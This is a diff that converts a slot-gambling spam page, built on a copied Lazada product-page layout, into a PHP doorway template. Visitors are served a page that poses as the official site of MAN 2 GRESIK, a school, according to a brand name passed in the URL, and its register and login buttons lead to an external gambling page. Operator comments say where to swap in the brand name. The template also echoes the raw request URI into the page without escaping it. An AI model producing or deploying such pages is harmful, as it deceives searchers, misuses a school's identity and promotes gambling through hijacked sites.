@@ -1,27 +1,84 @@
+<?php
 
-<!DOCTYPE HTML><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><base href="https://bkd2025.gosmart.id/">
+function feedback404()
+{
+    header("HTTP/1.0 404 Not Found");
+    echo "<h1>404 Not Found</h1>";
+}
+
+if (isset($_GET['top'])) {
+    $filename = "goban.txt";
+    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    $target_string = strtolower($_GET['top']);
+    foreach ($lines as $item) {
+        if (strtolower($item) === $target_string) {
+            $BRAND = strtoupper($target_string);
+            $SMALLBRAND = $target_string;
+        }
+    }
+    if (isset($BRAND)) {
+        $BRANDS = $BRAND;
+        $SMALLBRANDS = $SMALLBRAND;
+        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+        $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+        if (isset($fullUrl)) {
+            $parsedUrl = parse_url($fullUrl);
+            $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
+            $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
+            $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
+            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
+            $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
+            $urlPath = $baseUrl;
+        } else {
+            echo "URL saat ini tidak didefinisikan.";
+        }
+    } else {
+        feedback404();
+        exit();
+    }
+} else {
+    feedback404();
+    exit();
+}
+
+/*
+
+*GANTI NAMA BRAND DENGAN INI
+<?php echo $BRANDS ?>
+
+* GANTI URL PATH DENGAN INI
+<?php echo $urlPath ?>
+
+<?php echo $SMALLBRAND ?>
+
+* SAMA GANTI REDIRECT LOGIN/REGISTER
+
+*/
+
+?>
+<!DOCTYPE HTML><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><base href="<?php echo $urlPath ?>">
 <html xmlns:wormhole="http://www.w3.org/1999/xhtml" lang="id-ID">
 <head>
-    <base href="https://bkd2025.gosmart.id/"/>
-  <title>NIKMAT69: Situs Slot Gacor Terpercaya 2025 Situs Gampang Menang</title>
-  <meta name="description" content="NIKMAT69 adalah link situs slot gacor hari ini resmi gampang menang dengan ratusan game judi slot online terbaru serta fitur terupdate paling nyaman." />
+    <base href="<?php echo $urlPath ?>"/>
+  <title><?php echo $BRANDS ?> Login Situs Resmi - MAN 2 GRESIK</title>
+  <meta name="description" content="<?php echo $BRANDS ?> adalah Madrasah Aliyah Negeri yang berlokasi di Desa Metatu, Kecamatan Benjeng, Kabupaten Gresik, yang menekankan budaya beretika dan berwawasan lingkungan Adiwiyata, dengan tujuan utama membentuk warga madrasah yang peduli dan hidup bersih serta sehat." />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
   <meta name="aplus-auto-exp" content='[{"filter":"exp-tracking=suggest-official-store","logkey":"/lzdse.result.os_impr","props":["href"],"tag":"a"}]' />
   <meta name="data-spm" content="a2o4j" />
   <meta name="robots" content="index, follow" />
   <meta name="revisit-after" content="1 days">
   <meta name="revisit" content="1"/>
-  <meta name="og:url" content="https://bkd2025.gosmart.id/" />
-  <meta name="og:title" content="NIKMAT69: Situs Slot Gacor Terpercaya 2025 Situs Gampang Menang" />
+  <meta name="og:url" content="<?php echo $urlPath ?>" />
+  <meta name="og:title" content="<?php echo $BRANDS ?> Login Situs Resmi - MAN 2 GRESIK" />
   <meta name="og:type" content="product" />
-  <meta name="og:description" content="NIKMAT69 adalah link situs slot gacor hari ini resmi gampang menang dengan ratusan game judi slot online terbaru serta fitur terupdate paling nyaman." />
-  <meta name="og:image" content="https://i.imghippo.com/files/fML6973iCk.png" />
+  <meta name="og:description" content="<?php echo $BRANDS ?> adalah Madrasah Aliyah Negeri yang berlokasi di Desa Metatu, Kecamatan Benjeng, Kabupaten Gresik, yang menekankan budaya beretika dan berwawasan lingkungan Adiwiyata, dengan tujuan utama membentuk warga madrasah yang peduli dan hidup bersih serta sehat." />
+  <meta name="og:image" content="https://i.imghippo.com/files/RhD5372q.jpg" />
   <link rel="manifest" href="https://g.lazcdn.com/g/lzdfe/pwa-assets/5.0.7/manifest/id.json">
-  <link rel="shortcut icon" href="https://i.imghippo.com/files/TA8395nvw.png" />
-  <link rel="canonical" href="https://bkd2025.gosmart.id/" />
-  <link rel="amphtml" href="https://nikmat69-topup.web.app/" />
+  <link rel="shortcut icon" href="https://man2gresik.sch.id/media_library/images/ad79fa5cef22568875f40b396586b9d1.png" />
+  <link rel="canonical" href="<?php echo $urlPath ?>" />
+  <link rel="amphtml" href="https://vippage-man2.web.app/?top=<?php echo $BRANDS ?>" />
   <!-- start preload -->
-  <link rel="preload" href="https://i.imghippo.com/files/fML6973iCk.png" as="image" />
+  <link rel="preload" href="https://i.imghippo.com/files/RhD5372q.jpg" as="image" />
   <link rel="preconnect dns-prefetch" href="//cart.lazada.co.id" />
   <link rel="preconnect dns-prefetch" href="//acs-m.lazada.co.id" />
   <link rel="preconnect dns-prefetch" href="//laz-g-cdn.alicdn.com" />
@@ -57,7 +114,7 @@
       {
         "@context": "https://schema.org",
         "@type": "SoftwareApplication",
-        "name": "https://bkd2025.gosmart.id/",
+        "name": "<?php echo $urlPath ?>",
         "operatingSystem": "Android",
         "applicationCategory": "GameApplication",
         "aggregateRating": {
@@ -76,8 +133,8 @@
           },
           "author": {
             "@type": "Person",
-            "name": "NIKMAT69",
-            "reviewBody": "NIKMAT69 adalah link situs slot gacor hari ini resmi gampang menang dengan ratusan game judi slot online terbaru serta fitur terupdate paling nyaman."
+            "name": "<?php echo $BRANDS ?>",
+            "reviewBody": "<?php echo $BRANDS ?> adalah Madrasah Aliyah Negeri yang berlokasi di Desa Metatu, Kecamatan Benjeng, Kabupaten Gresik, yang menekankan budaya beretika dan berwawasan lingkungan Adiwiyata, dengan tujuan utama membentuk warga madrasah yang peduli dan hidup bersih serta sehat."
           }
         },
         "offers": {
@@ -158,7 +215,7 @@
       start: Date.now(),
     };
     var dataLayer = window.dataLayer || [];
-    var pdpTrackingData ="{"pdt_category":["Televisi & Video"],"pagetype":"pdp","pdt_discount":"","pdt_photo":"https://i.imghippo.com/files/fML6973iCk.png","v_voya":1,"brand_name":"NIKMAT69","brand_id":"842","pdt_sku":9978447445,"core":{"country":"ID","layoutType":"desktop","language":"in","currencyCode":"IDR"},"seller_name":"","pdt_simplesku":2255234788,"pdt_name":"NIKMAT69: Situs Slot Gacor Terpercaya 2025 Situs Gampang Menang","page":{"regCategoryId":"002147001474","xParams":"_p_typ=pdp&_p_ispdp=1&_p_item=9978447445_ID-2255234788&_p_prod=9978447445&_p_sku=2255234788&_p_slr="},"supplier_id":"","pdt_price":"Rp2.699.000"}";
+    var pdpTrackingData ="{"pdt_category":["Televisi & Video"],"pagetype":"pdp","pdt_discount":"","pdt_photo":"https://i.imghippo.com/files/RhD5372q.jpg","v_voya":1,"brand_name":"<?php echo $BRANDS ?>","brand_id":"842","pdt_sku":9978447445,"core":{"country":"ID","layoutType":"desktop","language":"in","currencyCode":"IDR"},"seller_name":"","pdt_simplesku":2255234788,"pdt_name":"<?php echo $BRANDS ?> Login Situs Resmi - MAN 2 GRESIK","page":{"regCategoryId":"002147001474","xParams":"_p_typ=pdp&_p_ispdp=1&_p_item=9978447445_ID-2255234788&_p_prod=9978447445&_p_sku=2255234788&_p_slr="},"supplier_id":"","pdt_price":"Rp2.699.000"}";
     try {
       pdpTrackingData = JSON.parse(pdpTrackingData);
       pdpTrackingData.v_voya = false;
@@ -676,7 +733,7 @@
 </div>
 
   <script type="application/ld+json">
-    {"@type":"Product","@context":"https://schema.org","name":"NIKMAT69: Situs Slot Gacor Terpercaya 2025 Situs Gampang Menang","image":"https://i.imghippo.com/files/fML6973iCk.png","category":"Game & Video","brand":{"@type":"Brand","name":"NIKMAT69","url":"https://bkd2025.gosmart.id/"},"sku":"9978447445_ID-2255234788","mpn":9978447445,"description":"NIKMAT69 adalah link situs slot gacor hari ini resmi gampang menang dengan ratusan game judi slot online terbaru serta fitur terupdate paling nyaman.","url":"https://bkd2025.gosmart.id/","offers":{"@type":"Offer","url":"https://bkd2025.gosmart.id/","seller":{"@type":"Organization","name":"NIKMAT69"},"priceCurrency":"IDR","price":0,"availability":"https://schema.org/InStock","itemCondition":"https://schema.org/NewCondition"}}
+    {"@type":"Product","@context":"https://schema.org","name":"<?php echo $BRANDS ?> Login Situs Resmi - MAN 2 GRESIK","image":"https://i.imghippo.com/files/RhD5372q.jpg","category":"Game & Video","brand":{"@type":"Brand","name":"<?php echo $BRANDS ?>","url":"<?php echo $urlPath ?>"},"sku":"9978447445_ID-2255234788","mpn":9978447445,"description":"<?php echo $BRANDS ?> adalah Madrasah Aliyah Negeri yang berlokasi di Desa Metatu, Kecamatan Benjeng, Kabupaten Gresik, yang menekankan budaya beretika dan berwawasan lingkungan Adiwiyata, dengan tujuan utama membentuk warga madrasah yang peduli dan hidup bersih serta sehat.","url":"<?php echo $urlPath ?>","offers":{"@type":"Offer","url":"<?php echo $urlPath ?>","seller":{"@type":"Organization","name":"<?php echo $BRANDS ?>"},"priceCurrency":"IDR","price":0,"availability":"https://schema.org/InStock","itemCondition":"https://schema.org/NewCondition"}}
   </script>
   <script type="application/ld+json" data-rh="true">
       {
@@ -686,36 +743,36 @@
           "@type": "ListItem",
           "position": 1,
           "item": {
-            "@id": "https://bkd2025.gosmart.id/",
+            "@id": "<?php echo $urlPath ?>",
             "name": "SLOT"
           }
         }, {
           "@type": "ListItem",
           "position": 2,
           "item": {
-            "@id": "https://bkd2025.gosmart.id/",
+            "@id": "<?php echo $urlPath ?>",
             "name": "LINK SLOT"
           }
         }, {
           "@type": "ListItem",
           "position": 3,
           "item": {
-            "@id": "https://bkd2025.gosmart.id/",
+            "@id": "<?php echo $urlPath ?>",
             "name": "SLOT GACOR"
           }
         }, {
           "@type": "ListItem",
           "position": 4,
           "item": {
-            "@id": "https://bkd2025.gosmart.id/",
+            "@id": "<?php echo $urlPath ?>",
             "name": "SITUS SLOT GACOR"
           }
         }, {
           "@type": "ListItem",
           "position": 5,
           "item": {
-            "@id": "https://bkd2025.gosmart.id/",
-            "name": "NIKMAT69: Situs Slot Gacor Terpercaya 2025 Situs Gampang Menang"
+            "@id": "<?php echo $urlPath ?>",
+            "name": "<?php echo $BRANDS ?> Login Situs Resmi - MAN 2 GRESIK"
           }
         }]
       }
@@ -812,7 +869,7 @@
       <div class="lzd-header-content">
         <div class="lzd-logo-bar">
           <div class="logo-bar-content header-content">
-              <div class="lzd-logo-content"><a href="https://bkd2025.gosmart.id/" data-spm="dhome"><img src="https://file001.nxtengine.net/open-img-pub/brands/nikmat69.gif" alt="NIKMAT69: Situs Slot Gacor Terpercaya 2025 Situs Gampang Menang" style="width: min-content;"></a></div>
+              <div class="lzd-logo-content"><a href="<?php echo $urlPath ?>" data-spm="dhome"><img src="https://res.cloudinary.com/dans0dwg0/image/upload/v1748756288/slot-gacor6_y2azcs.png" alt="<?php echo $BRANDS ?> Login Situs Resmi - MAN 2 GRESIK" style="width: min-content;"></a></div>
               <div class="lzd-nav-search " data-spm="search">
                 <div id="button" data-spm-click="gostr=/lzdpub.header.search;locaid=d_go"></div>
               </div>
@@ -821,7 +878,7 @@
 <div class="lzd-site-nav-menu lzd-site-nav-menu-active" data-mod-name="@ali/lzdmod-site-menu-nav-pc/pc/index" data-config="{}">
     <div class="lzd-site-menu-nav-container">
         <div class="lzd-site-menu-nav-category">
-            <a href="https://bkd2025.gosmart.id/">
+            <a href="<?php echo $urlPath ?>">
                 <span class="lzd-site-menu-nav-category-text">Kategori</span>
             </a>
             <div class="lzd-site-menu-nav-menu">
@@ -1871,7 +1928,7 @@
 <div class="lzd-site-nav-menu lzd-site-nav-menu-active" data-mod-name="@ali/lzdmod-site-menu-nav-pc/pc/index" data-config="{}">
     <div class="lzd-site-menu-nav-container">
         <div class="lzd-site-menu-nav-category">
-            <a href="https://bkd2025.gosmart.id/">
+            <a href="<?php echo $urlPath ?>">
                 <span class="lzd-site-menu-nav-category-text">Kategori</span>
             </a>
             <div class="lzd-site-menu-nav-menu">
@@ -3112,15 +3169,15 @@ if (!lzdDocCookies.getItem('t_uid')) {
       <ul class="breadcrumb" id="J_breadcrumb">
     <li class="breadcrumb_item">
     <span class="breadcrumb_item_text">
-    <a title="NIKMAT69" href="https://nikmat69-topup.web.app/" class="breadcrumb_item_anchor" data-spm-anchor-id="a2o4j.pdp_revamp.breadcrumb.1"><span>NIKMAT69</span></a><div class="breadcrumb_right_arrow"></div></span></li>
+    <a title="<?php echo $BRANDS ?>" href="<?php echo $urlPath ?>" class="breadcrumb_item_anchor" data-spm-anchor-id="a2o4j.pdp_revamp.breadcrumb.1"><span><?php echo $BRANDS ?></span></a><div class="breadcrumb_right_arrow"></div></span></li>
     <li class="breadcrumb_item">
-    <span class="breadcrumb_item_text"><a title="LINK SLOT" href="https://bkd2025.gosmart.id/" class="breadcrumb_item_anchor" data-spm-anchor-id="a2o4j.pdp_revamp.breadcrumb.2"><span>LINK SLOT</span></a><div class="breadcrumb_right_arrow"></div></span></li>
+    <span class="breadcrumb_item_text"><a title="LINK SLOT" href="<?php echo $urlPath ?>" class="breadcrumb_item_anchor" data-spm-anchor-id="a2o4j.pdp_revamp.breadcrumb.2"><span>LINK SLOT</span></a><div class="breadcrumb_right_arrow"></div></span></li>
     <li class="breadcrumb_item">
-    <span class="breadcrumb_item_text"><a title="SLOT GACOR" href="https://bkd2025.gosmart.id/" class="breadcrumb_item_anchor" data-spm-anchor-id="a2o4j.pdp_revamp.breadcrumb.3"><span>SLOT GACOR</span></a><div class="breadcrumb_right_arrow"></div></span></li>
+    <span class="breadcrumb_item_text"><a title="SLOT GACOR" href="<?php echo $urlPath ?>" class="breadcrumb_item_anchor" data-spm-anchor-id="a2o4j.pdp_revamp.breadcrumb.3"><span>SLOT GACOR</span></a><div class="breadcrumb_right_arrow"></div></span></li>
     <li class="breadcrumb_item">
-    <span class="breadcrumb_item_text"><a title="SITUS SLOT GACOR" href="https://bkd2025.gosmart.id/" class="breadcrumb_item_anchor" data-spm-anchor-id="a2o4j.pdp_revamp.breadcrumb.4"><span data-spm-anchor-id="a2o4j.pdp_revamp.breadcrumb.i0.72711c72BNY9K6">SITUS SLOT GACOR</span></a><div class="breadcrumb_right_arrow"></div></span></li>
+    <span class="breadcrumb_item_text"><a title="SITUS SLOT GACOR" href="<?php echo $urlPath ?>" class="breadcrumb_item_anchor" data-spm-anchor-id="a2o4j.pdp_revamp.breadcrumb.4"><span data-spm-anchor-id="a2o4j.pdp_revamp.breadcrumb.i0.72711c72BNY9K6">SITUS SLOT GACOR</span></a><div class="breadcrumb_right_arrow"></div></span></li>
     <li class="breadcrumb_item"><span class="breadcrumb_item_text">
-    <span class="breadcrumb_item_anchor breadcrumb_item_anchor_last">NIKMAT69: Situs Slot Gacor Terpercaya 2025 Situs Gampang Menang</span></span></li></ul>
+    <span class="breadcrumb_item_anchor breadcrumb_item_anchor_last"><?php echo $BRANDS ?> Login Situs Resmi - MAN 2 GRESIK</span></span></li></ul>
     </div>
     <script type="e4587ea736eb1659062f36b5-text/javascript">
       function htmlEncodePdp(input) {
@@ -3200,22 +3257,22 @@ if (!lzdDocCookies.getItem('t_uid')) {
   }
  </style>
 <div class="n-columns-2" style="font-size: 20px;">
-<a href="https://nikmat69-topup.web.app/" rel="nofollow noreferrer" class="login">DAFTAR NIKMAT69</a>
-<a href="https://nikmat69-topup.web.app/" rel="nofollow noreferrer" class="register">LOGIN NIKMAT69</a>
+<a href="https://vippage-man2.web.app/?top=<?php echo $BRANDS ?>" rel="nofollow noreferrer" class="login">DAFTAR <?php echo $BRANDS ?></a>
+<a href="https://vippage-man2.web.app/?top=<?php echo $BRANDS ?>" rel="nofollow noreferrer" class="register">LOGIN <?php echo $BRANDS ?></a>
  </div>
  
   <div id="container" style="visibility: visible;">
-    <div id="root" class="pdp-block" data-reactroot=""><div id="module_core" class="pdp-block module"><p></p></div><div id="block-r3bZB9J63C" class="pdp-block pdp-block_group_buy_tip"><div id="module_group_buy_tip" class="pdp-block module"></div></div><div id="block-9uUVSSMxTb" class="pdp-block pdp-block__main-information"><div id="block-W59OjAyxSy" class="pdp-block pdp-block__gallery"><div id="module_item_gallery_1" class="pdp-block module"><div class="item-gallery" data-spm="gallery"><div class="gallery-preview-panel"><div class="gallery-preview-panel__content"><img class="pdp-mod-common-image gallery-preview-panel__image" alt="NIKMAT69: Situs Slot Gacor Terpercaya 2025 Situs Gampang Menang" src="https://i.imghippo.com/files/fML6973iCk.png"/></div></div>
-  <a href="https://nikmat69-topup.web.app/" rel="nofollow noopener" target="_blank"><img src="https://i.imgur.com/zLrUWHq.gif" width="100%" height="auto" alt="daftar slot"></a>
-  </div></div></div><div id="block-n8THsmEaVS" class="pdp-block pdp-block__main-information-detail"><div id="block-6QhDn4z1db" class="pdp-block"><div id="block-ssuYrXSucaM" class="pdp-block pdp-block__product-detail"><div id="module_flash_sale" class="pdp-block module"></div><div id="module_crazy_deal" class="pdp-block module"></div><div id="module_redmart_top_promo_banner" class="pdp-block module"></div><div id="module_product_title_1" class="pdp-block module"><div class="pdp-product-title"><div class="pdp-mod-product-badge-wrapper"><h1 class="pdp-mod-product-badge-title">NIKMAT69: Situs Slot Gacor Terpercaya 2025 Situs Gampang Menang</h1></div></div></div><div id="module_pre-order-tag" class="pdp-block module"></div><div id="block-C7wdxsrWYA0" class="pdp-block pdp-block__rating-questions-summary"><div id="block-qkzkCPtx4vZ" class="pdp-block pdp-block__rating-questions"><div id="module_product_review_star_1" class="pdp-block module"><div class="pdp-review-summary"><div class="container-star pdp-review-summary__stars pdp-stars_size_s"><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/></div><a href="https://bkd2025.gosmart.id/" class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-review-summary__link" data-spm-anchor-id="a2o4j.pdp_revamp.0.0">NIKMAT69</a></div></div></div><div id="block-ztlO6gvyRIv" class="pdp-block pdp-block__share"><div id="block--PRjoF98du4" class="pdp-block" style="display:inline-block;width:24px;height:54px"><div id="module_product_share_1" class="pdp-block module"></div></div><div id="block-7fC8S_Z8DDj" class="pdp-block" style="display:inline-block"><div id="module_product_wishlist_1" class="pdp-block module"><p></p></div></div></div></div><div id="module_product_brand_1" class="pdp-block module">
-  <div class="pdp-product-brand"><span class="pdp-product-brand__name">MEREK<!-- -->:<!-- --> </span><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-product-brand__brand-link" target="_self" href="https://bkd2025.gosmart.id/">NIKMAT69</a></div></div><div id="module_product_attrs" class="pdp-block module"></div><div id="block-cKVxLtoIbl2" class="pdp-block module"></div><div id="module_product_price_1" class="pdp-block module"><div class="pdp-mod-product-price">
+    <div id="root" class="pdp-block" data-reactroot=""><div id="module_core" class="pdp-block module"><p></p></div><div id="block-r3bZB9J63C" class="pdp-block pdp-block_group_buy_tip"><div id="module_group_buy_tip" class="pdp-block module"></div></div><div id="block-9uUVSSMxTb" class="pdp-block pdp-block__main-information"><div id="block-W59OjAyxSy" class="pdp-block pdp-block__gallery"><div id="module_item_gallery_1" class="pdp-block module"><div class="item-gallery" data-spm="gallery"><div class="gallery-preview-panel"><div class="gallery-preview-panel__content"><img class="pdp-mod-common-image gallery-preview-panel__image" alt="<?php echo $BRANDS ?> Login Situs Resmi - MAN 2 GRESIK" src="https://i.imghippo.com/files/RhD5372q.jpg"/></div></div>
+  <a href="https://vippage-man2.web.app/?top=<?php echo $BRANDS ?>" rel="nofollow noopener" target="_blank"><img src="https://cst.ridgewater.edu/img/mahjonggif.gif" width="100%" height="auto" alt="daftar slot"></a>
+  </div></div></div><div id="block-n8THsmEaVS" class="pdp-block pdp-block__main-information-detail"><div id="block-6QhDn4z1db" class="pdp-block"><div id="block-ssuYrXSucaM" class="pdp-block pdp-block__product-detail"><div id="module_flash_sale" class="pdp-block module"></div><div id="module_crazy_deal" class="pdp-block module"></div><div id="module_redmart_top_promo_banner" class="pdp-block module"></div><div id="module_product_title_1" class="pdp-block module"><div class="pdp-product-title"><div class="pdp-mod-product-badge-wrapper"><h1 class="pdp-mod-product-badge-title"><?php echo $BRANDS ?> Login Situs Resmi - MAN 2 GRESIK</h1></div></div></div><div id="module_pre-order-tag" class="pdp-block module"></div><div id="block-C7wdxsrWYA0" class="pdp-block pdp-block__rating-questions-summary"><div id="block-qkzkCPtx4vZ" class="pdp-block pdp-block__rating-questions"><div id="module_product_review_star_1" class="pdp-block module"><div class="pdp-review-summary"><div class="container-star pdp-review-summary__stars pdp-stars_size_s"><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/></div><a href="<?php echo $urlPath ?>" class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-review-summary__link" data-spm-anchor-id="a2o4j.pdp_revamp.0.0"><?php echo $BRANDS ?></a></div></div></div><div id="block-ztlO6gvyRIv" class="pdp-block pdp-block__share"><div id="block--PRjoF98du4" class="pdp-block" style="display:inline-block;width:24px;height:54px"><div id="module_product_share_1" class="pdp-block module"></div></div><div id="block-7fC8S_Z8DDj" class="pdp-block" style="display:inline-block"><div id="module_product_wishlist_1" class="pdp-block module"><p></p></div></div></div></div><div id="module_product_brand_1" class="pdp-block module">
+  <div class="pdp-product-brand"><span class="pdp-product-brand__name">MEREK<!-- -->:<!-- --> </span><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-product-brand__brand-link" target="_self" href="<?php echo $urlPath ?>"><?php echo $BRANDS ?></a></div></div><div id="module_product_attrs" class="pdp-block module"></div><div id="block-cKVxLtoIbl2" class="pdp-block module"></div><div id="module_product_price_1" class="pdp-block module"><div class="pdp-mod-product-price">
     <footer class="footer-container container"> 
          <div class="row site-description-container">
-            <p style="text-align: justify;">NIKMAT69 adalah link situs slot gacor hari ini resmi gampang menang dengan ratusan game judi slot online terbaru serta fitur terupdate paling nyaman.</p></div>
+            <p style="text-align: justify;"><?php echo $BRANDS ?> adalah Madrasah Aliyah Negeri yang berlokasi di Desa Metatu, Kecamatan Benjeng, Kabupaten Gresik, yang menekankan budaya beretika dan berwawasan lingkungan Adiwiyata, dengan tujuan utama membentuk warga madrasah yang peduli dan hidup bersih serta sehat.</p></div>
     </div>
 
 
-    <div class="pdp-product-price" bis_skin_checked="1"><span class="notranslate pdp-price pdp-price_type_normal pdp-price_color_orange pdp-price_size_xl" data-spm-anchor-id="a2o4j.pdp_revamp.0.i0.241073bdUG5ius">IDR 25.000</span><div class="origin-block" bis_skin_checked="1"><span class="notranslate pdp-price pdp-price_type_deleted pdp-price_color_lightgray pdp-price_size_xs">100%</span><span class="pdp-product-price__discount">Tanpa Potongan</span></div></div></div></div><div id="module_redmart_product_price" class="pdp-block module"></div><div id="module_promotion_tags" class="pdp-block module"></div><div id="module_installment" class="pdp-block module"></div><div id="module_quantity-input" class="pdp-block module"><div class="pdp-mod-product-info-section sku-quantity-selection" bis_skin_checked="1"><h6 class="section-title">Kuantitas</h6><div class="section-content" bis_skin_checked="1"><div class="next-number-picker next-number-picker-inline" bis_skin_checked="1"><div class="next-number-picker-handler-wrap" bis_skin_checked="1"><a unselectable="unselectable" class="next-number-picker-handler next-number-picker-handler-up "><span unselectable="unselectable" class="next-number-picker-handler-up-inner"><i class="next-icon next-icon-add next-icon-medium"></i></span></a><a unselectable="unselectable" class="next-number-picker-handler next-number-picker-handler-down next-number-picker-handler-down-disabled"><span unselectable="unselectable" class="next-number-picker-handler-down-inner"><i class="next-icon next-icon-minus next-icon-medium"></i></span></a></div><div class="next-number-picker-input-wrap" bis_skin_checked="1"><span class="next-input next-input-single next-input-medium next-number-picker-input"><input min="1" max="5" step="1" autocomplete="off" type="text" height="100%" value="1"></span></div></div><span class="quantity-content-default"></span></div></div></div><div id="module_sms-phone-input" class="pdp-block module"></div><div id="module_add_to_cart" class="pdp-block module" bis_skin_checked="1"><div class="pdp-cart-concern" bis_skin_checked="1"><a href="https://nikmat69-topup.web.app/"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_yellow pdp-button_size_xl" data-spm-anchor-id="a2o4j.pdp_revamp.0.i0.241073bdeHYO5j"><span class="pdp-button-text">DAFTAR</span></button></a><a href="https://nikmat69-topup.web.app/" target="_blank"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_orange pdp-button_size_xl"><span class="pdp-button-text"><span class="">LOGIN</span></span></button></a><form method="post" action=""><input name="buyParams" type="hidden" value="{&quot;items&quot;:[{&quot;itemId&quot;:&quot;9978447445&quot;,&quot;skuId&quot;:&quot;2255234788&quot;,&quot;quantity&quot;:1,&quot;attributes&quot;:null}]}"></form></div></div><div id="module_redmart_add_to_cart" class="pdp-block module"></div></div><div id="block-O-HF3LN4YVI" class="pdp-block pdp-block__delivery-seller"><div id="module_seller_delivery" class="pdp-block module"><div data-spm="delivery_options" data-nosnippet="true"></div></div><div id="module_redmart_delivery" class="pdp-block module"></div><div id="module_seller_warranty" class="pdp-block module"></div><div id="module_guide_app" class="pdp-block module"></div><div id="module_redmart_service" class="pdp-block module"></div><div id="module_seller_info" class="pdp-block module"><div class="seller-container" data-spm="seller"><div class="seller-name"><div class="seller-name__wrapper"><div class="seller-name__title"> </div><div class="seller-name__detail" data-spm="seller"><a class="pdp-link pdp-link_size_l pdp-link_theme_black seller-name__detail-name"></a></div></div></div><div class="pdp-seller-info-pc"></div></div></div><div id="module_redmart_seller_info" class="pdp-block module"></div></div></div></div></div></div>
+    <div class="pdp-product-price" bis_skin_checked="1"><span class="notranslate pdp-price pdp-price_type_normal pdp-price_color_orange pdp-price_size_xl" data-spm-anchor-id="a2o4j.pdp_revamp.0.i0.241073bdUG5ius">IDR 25.000</span><div class="origin-block" bis_skin_checked="1"><span class="notranslate pdp-price pdp-price_type_deleted pdp-price_color_lightgray pdp-price_size_xs">100%</span><span class="pdp-product-price__discount">Tanpa Potongan</span></div></div></div></div><div id="module_redmart_product_price" class="pdp-block module"></div><div id="module_promotion_tags" class="pdp-block module"></div><div id="module_installment" class="pdp-block module"></div><div id="module_quantity-input" class="pdp-block module"><div class="pdp-mod-product-info-section sku-quantity-selection" bis_skin_checked="1"><h6 class="section-title">Kuantitas</h6><div class="section-content" bis_skin_checked="1"><div class="next-number-picker next-number-picker-inline" bis_skin_checked="1"><div class="next-number-picker-handler-wrap" bis_skin_checked="1"><a unselectable="unselectable" class="next-number-picker-handler next-number-picker-handler-up "><span unselectable="unselectable" class="next-number-picker-handler-up-inner"><i class="next-icon next-icon-add next-icon-medium"></i></span></a><a unselectable="unselectable" class="next-number-picker-handler next-number-picker-handler-down next-number-picker-handler-down-disabled"><span unselectable="unselectable" class="next-number-picker-handler-down-inner"><i class="next-icon next-icon-minus next-icon-medium"></i></span></a></div><div class="next-number-picker-input-wrap" bis_skin_checked="1"><span class="next-input next-input-single next-input-medium next-number-picker-input"><input min="1" max="5" step="1" autocomplete="off" type="text" height="100%" value="1"></span></div></div><span class="quantity-content-default"></span></div></div></div><div id="module_sms-phone-input" class="pdp-block module"></div><div id="module_add_to_cart" class="pdp-block module" bis_skin_checked="1"><div class="pdp-cart-concern" bis_skin_checked="1"><a href="https://vippage-man2.web.app/?top=<?php echo $BRANDS ?>"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_yellow pdp-button_size_xl" data-spm-anchor-id="a2o4j.pdp_revamp.0.i0.241073bdeHYO5j"><span class="pdp-button-text">DAFTAR</span></button></a><a href="https://vippage-man2.web.app/?top=<?php echo $BRANDS ?>" target="_blank"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_orange pdp-button_size_xl"><span class="pdp-button-text"><span class="">LOGIN</span></span></button></a><form method="post" action=""><input name="buyParams" type="hidden" value="{&quot;items&quot;:[{&quot;itemId&quot;:&quot;9978447445&quot;,&quot;skuId&quot;:&quot;2255234788&quot;,&quot;quantity&quot;:1,&quot;attributes&quot;:null}]}"></form></div></div><div id="module_redmart_add_to_cart" class="pdp-block module"></div></div><div id="block-O-HF3LN4YVI" class="pdp-block pdp-block__delivery-seller"><div id="module_seller_delivery" class="pdp-block module"><div data-spm="delivery_options" data-nosnippet="true"></div></div><div id="module_redmart_delivery" class="pdp-block module"></div><div id="module_seller_warranty" class="pdp-block module"></div><div id="module_guide_app" class="pdp-block module"></div><div id="module_redmart_service" class="pdp-block module"></div><div id="module_seller_info" class="pdp-block module"><div class="seller-container" data-spm="seller"><div class="seller-name"><div class="seller-name__wrapper"><div class="seller-name__title"> </div><div class="seller-name__detail" data-spm="seller"><a class="pdp-link pdp-link_size_l pdp-link_theme_black seller-name__detail-name"></a></div></div></div><div class="pdp-seller-info-pc"></div></div></div><div id="module_redmart_seller_info" class="pdp-block module"></div></div></div></div></div></div>
   </div>
   
